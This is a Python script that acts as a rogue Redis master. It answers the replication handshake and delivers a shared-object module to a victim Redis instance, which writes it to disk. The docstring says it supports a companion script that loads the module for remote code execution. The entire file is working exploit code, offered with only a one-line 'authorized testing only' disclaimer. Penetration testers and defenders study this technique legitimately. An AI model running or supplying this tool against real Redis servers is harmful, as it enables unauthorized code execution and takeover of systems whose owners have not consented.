#!/usr/bin/env python3
"""redis-rogue-master.py — fake Redis master that ships a binary payload
to a victim Redis instance via the replication handshake.

Used by redis-rce-module.sh to write a .so module into the victim's
filesystem when direct CONFIG SET + SAVE won't produce a valid binary
(Redis encodes SAVE output as RDB, so the binary must arrive over
the replication stream instead).

Wire-level details:
    1. Victim connects to us (after we issue REPLICAOF on victim).
    2. Victim sends:    PING
    3. We reply:        +PONG
    4. Victim sends:    REPLCONF listening-port <n> / REPLCONF capa ...
    5. We reply:        +OK   (to each)
    6. Victim sends:    PSYNC ? -1
    7. We reply:        +FULLRESYNC <runid> 0
       (40-char fake runid + offset 0)
    8. We send:         $<size>\\r\\n<raw bytes>\\r\\n
       The <raw bytes> is the .so file. Redis writes it to <dir>/<dbfilename>
       as set via CONFIG SET prior to REPLICAOF.

Usage:
    redis-rogue-master.py --port 46379 --payload module/system.so
        Listens once, serves one payload, exits cleanly when the victim
        disconnects after the FULLRESYNC.

Authorized testing only.
"""
from __future__ import annotations
import argparse, os, socket, sys, time, threading, signal

RUNID = b"a" * 40  # any 40-char hex/ascii works

def serve_one(host: str, port: int, payload: bytes, timeout: int = 60):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    s.listen(1)
    s.settimeout(timeout)
    print(f"[*] Fake master listening on {host}:{port} (timeout {timeout}s)", flush=True)

    try:
        conn, addr = s.accept()
    except socket.timeout:
        print("[!] timed out waiting for victim to connect", file=sys.stderr); return 2
    print(f"[+] Victim connected from {addr[0]}:{addr[1]}", flush=True)
    conn.settimeout(15)

    buf = b""
    def recv_some():
        nonlocal buf
        chunk = conn.recv(4096)
        if not chunk: raise ConnectionError("victim closed")
        buf += chunk

    def consume_line() -> bytes:
        nonlocal buf
        while b"\r\n" not in buf:
            recv_some()
        line, _, rest = buf.partition(b"\r\n")
        buf = rest
        return line

    def consume_array() -> list:
        """Read one RESP request (inline OR *N\\r\\n$L\\r\\n... form)."""
        nonlocal buf
        while not buf:
            recv_some()
        if buf[:1] != b"*":
            # inline command (PING, etc.)
            line = consume_line()
            return line.split()
        # *N\r\n
        header = consume_line()       # *N
        n = int(header[1:])
        parts = []
        for _ in range(n):
            tag = consume_line()      # $L
            l = int(tag[1:])
            while len(buf) < l + 2:   # need l bytes + \r\n
                recv_some()
            parts.append(buf[:l])
            buf = buf[l+2:]
        return parts

    # Real Redis handshake is PING + a few REPLCONF + PSYNC = 3-5 commands.
    # Cap at MAX_HANDSHAKE_CMDS so a buggy or hostile peer that streams
    # garbage can't keep us looping indefinitely, but make the cap explicit
    # rather than the magic `range(20)` that obscured intent.
    MAX_HANDSHAKE_CMDS = 50
    try:
        # Step 2-7 — respond to handshake
        cmd_count = 0
        while cmd_count < MAX_HANDSHAKE_CMDS:
            cmd_count += 1
            cmd_parts = consume_array()
            if not cmd_parts:
                continue
            verb = cmd_parts[0].upper()
            print(f"  victim -> {b' '.join(cmd_parts[:4])!r}{'...' if len(cmd_parts)>4 else ''}", flush=True)

            if verb == b"PING":
                conn.sendall(b"+PONG\r\n")
            elif verb == b"REPLCONF":
                conn.sendall(b"+OK\r\n")
            elif verb == b"PSYNC":
                # +FULLRESYNC <runid> 0
                conn.sendall(b"+FULLRESYNC " + RUNID + b" 0\r\n")
                # Then the "RDB" (our payload bytes) as bulk string
                conn.sendall(b"$" + str(len(payload)).encode() + b"\r\n")
                conn.sendall(payload)
                # NOTE: real Redis appends \r\n after the bulk string;
                # many PoCs omit it because the victim writes the
                # exact payload length to disk. Including it for protocol
                # correctness — Redis tolerates trailing bytes.
                conn.sendall(b"\r\n")
                print(f"[+] Sent {len(payload)} bytes payload (FULLRESYNC). Waiting briefly...", flush=True)
                # Give victim time to fsync the file before we close
                time.sleep(2)
                break
            elif verb in (b"AUTH", b"SELECT"):
                conn.sendall(b"+OK\r\n")
            else:
                conn.sendall(b"+OK\r\n")
        else:
            print(f"[!] handshake hit MAX_HANDSHAKE_CMDS={MAX_HANDSHAKE_CMDS} without seeing PSYNC — bailing", file=sys.stderr)
            return 3
        return 0
    finally:
        try: conn.shutdown(socket.SHUT_RDWR)
        except OSError: pass
        conn.close()
        s.close()


def main():
    ap = argparse.ArgumentParser(description=__doc__.split("\n\n")[0])
    ap.add_argument("--host",    default="0.0.0.0", help="listen address (default 0.0.0.0)")
    ap.add_argument("--port",    type=int, default=46379, help="listen port (default 46379)")
    ap.add_argument("--payload", required=True, help="path to file to deliver (.so module)")
    ap.add_argument("--timeout", type=int, default=60, help="seconds to wait for connect")
    args = ap.parse_args()

    if not os.path.isfile(args.payload):
        print(f"error: payload not found: {args.payload}", file=sys.stderr); return 2
    with open(args.payload, "rb") as f:
        data = f.read()
    print(f"[*] Loaded payload: {args.payload} ({len(data)} bytes)")
    return serve_one(args.host, args.port, data, args.timeout)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] interrupted")
        sys.exit(130)
